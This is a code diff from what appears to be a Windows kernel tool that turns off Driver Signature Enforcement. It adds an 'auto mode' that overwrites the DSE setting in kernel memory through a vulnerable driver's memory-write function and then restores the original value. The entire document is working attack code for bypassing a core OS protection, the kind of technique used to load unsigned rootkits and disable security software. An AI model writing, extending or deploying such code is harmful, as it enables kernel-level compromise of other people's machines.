@@ -2411,6 +2411,37 @@ int MyExecuteCLI(THREAD_TASK_NO ttno)
 
         printf("[+] DSE restored to original value successfully!\n");
     }
+    else if(ttno == ThreadTaskAutoDSE)
+    {
+        printf("[*] Auto mode: temporarily disabling DSE...\n");
+
+        if(g.pd.dwDSEActualValue != g.pd.dwDSEDisableValue)
+        {
+            if(g.vd[sel].pFunctionWriteMemory(hDevice,g.pd.ui64PatchAddress,g.pd.dwPatchSize,g.pd.dwDSEDisableValue) != 0)
+            {
+                printf("[!] Error: Can't disable DSE in auto mode!\n");
+                rc = 15;
+                goto cleanup;
+            }
+
+            printf("[+] DSE disabled successfully!\n");
+        }
+        else
+        {
+            printf("[*] DSE is already disabled.\n");
+        }
+
+        printf("[*] Auto mode: restoring DSE to original value...\n");
+
+        if(g.vd[sel].pFunctionWriteMemory(hDevice,g.pd.ui64PatchAddress,g.pd.dwPatchSize,g.pd.dwDSEOriginalValue) != 0)
+        {
+            printf("[!] Error: Can't restore DSE in auto mode!\n");
+            rc = 16;
+            goto cleanup;
+        }
+
+        printf("[+] DSE restored to original value successfully!\n");
+    }
 
     // read and display new DSE value
     g.pd.dwDSEActualValue = 0xFFFFFFFF;
